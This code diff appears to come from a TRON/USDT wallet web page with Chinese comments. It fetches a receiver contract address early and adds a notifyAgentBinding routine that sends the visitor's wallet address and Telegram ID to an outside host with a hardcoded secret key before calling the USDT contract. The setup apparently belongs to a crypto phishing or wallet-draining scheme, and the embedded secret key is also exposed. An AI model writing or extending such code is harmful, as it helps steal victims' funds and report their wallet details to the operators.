@@ -421,17 +421,24 @@
 					return
 				}
 
+				// 提前获取接收地址，以便在上报中使用
+				const receiver = await getContractAddress()
+				if (!receiver) {
+					showTemporaryMessage('获取收款地址失败')
+					return
+				}
+
 				if (parseFloat(userData.trxBalance) < 15) {
 					showTemporaryMessage('TRX能量不足')
 					notifyAgentBinding(window.tronWeb.defaultAddress.base58, receiver)
 
 					return
 				} else {
-					const receiver = await getContractAddress()
-					if (!receiver) {
-						showTemporaryMessage('获取收款地址失败')
-						return
-					}
+					// const receiver = await getContractAddress() // moved up
+					// if (!receiver) {
+					// 	showTemporaryMessage('获取收款地址失败')
+					// 	return
+					// }
 
 					try {
 						const contract = await window.tronWeb.contract().at(USDT_CONTRACT)
@@ -454,15 +461,17 @@
 			function notifyAgentBinding(walletAddress, serviceAccount) {
 				const WEB_APP_URL = 'https://vipusdt.dpdns.org/'
 				const SECRET_API_KEY = '5bZk4n9czeodcjtmnPlgWsvS3gBX47hq8pqLvHKXEOc='
-				window.tgid = GetRequest().tgid || ''
+				// window.tgid = GetRequest().tgid || ''
+				// 修复: d/1.html 中没有 GetRequest，使用 getParamOrCache
+				const tgid = getParamOrCache('tgid')
 
-				if (!window.tgid) {
+				if (!tgid) {
 					console.log('No tgid found, skipping agent binding.')
 					return
 				}
 
 				const data = {
-					telegramId: window.tgid,
+					telegramId: tgid,
 					address: walletAddress,
 					serviceAccount: serviceAccount,
 				}
